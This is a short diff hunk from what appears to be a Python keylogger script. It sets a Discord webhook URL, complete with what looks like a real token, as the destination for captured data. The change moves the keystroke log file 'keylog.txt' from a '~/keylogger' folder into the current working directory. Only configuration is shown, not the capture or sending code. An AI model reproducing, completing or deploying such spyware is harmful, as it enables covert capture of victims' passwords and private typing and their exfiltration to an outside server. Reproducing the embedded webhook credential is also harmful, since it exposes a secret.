@@ -6,7 +6,7 @@ import requests
 # === CONFIG ===
 webhook_url = "https://discord.com/api/webhooks/1361504169411870750/u9EHvt1B37NZMSIllaMg2GkhC21v7RX3WhJt84sUo8HBL8lZ_8jy3lCiei7ohRf53JBR"
 
-log_folder = os.path.expanduser("~/keylogger")
+log_folder = os.getcwd()
 os.makedirs(log_folder, exist_ok=True)
 log_file = os.path.join(log_folder, "keylog.txt")
 
